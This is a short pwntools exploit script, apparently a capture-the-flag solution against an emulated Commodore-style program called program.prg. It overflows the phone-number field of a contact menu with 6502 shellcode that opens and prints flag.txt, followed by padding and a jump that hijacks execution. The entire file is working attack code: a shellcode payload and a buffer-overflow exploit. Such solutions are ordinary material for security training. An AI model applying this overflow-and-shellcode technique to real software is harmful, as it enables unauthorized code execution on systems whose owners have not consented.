from pwn import *

shellcode = [0x4C, 0x6C, 0xC0, 0x66, 0x6C, 0x61, 0x67, 0x2E, 0x74, 0x78, 0x74, 0x00,
             0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
             0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
             0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
             0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xA9, 0x09, 0xA2, 0x39, 0xA0, 0xC0,
             0x20, 0xBD, 0xFF, 0xA9, 0x01, 0xA6, 0xBA, 0xD0, 0x02, 0xA2, 0x08, 0xA0,
             0x00, 0x20, 0xBA, 0xFF, 0xA2, 0x42, 0xA0, 0xC0, 0xA9, 0x00, 0x20, 0xD5,
             0xFF, 0xB0, 0x12, 0xA9, 0x42, 0x85, 0xFB, 0xA9, 0xC0, 0x85, 0xFC, 0xA0,
             0xFF, 0xC8, 0xB1, 0xFB, 0x20, 0xD2, 0xFF, 0xD0, 0xF8, 0x60]

payload = bytes(shellcode)
payload += (0x41c-0xa0) * b"\xea"
payload += b"\x4c\x36\xc0"

p = process(["runtime", "program.prg"])

p.sendlineafter(b"3. exit\n", b"1")
p.sendlineafter(b"enter first name: ", b"")
p.sendlineafter(b"enter last name: ", b"")
p.sendlineafter(b"enter phone: ", payload)
print(p.readall())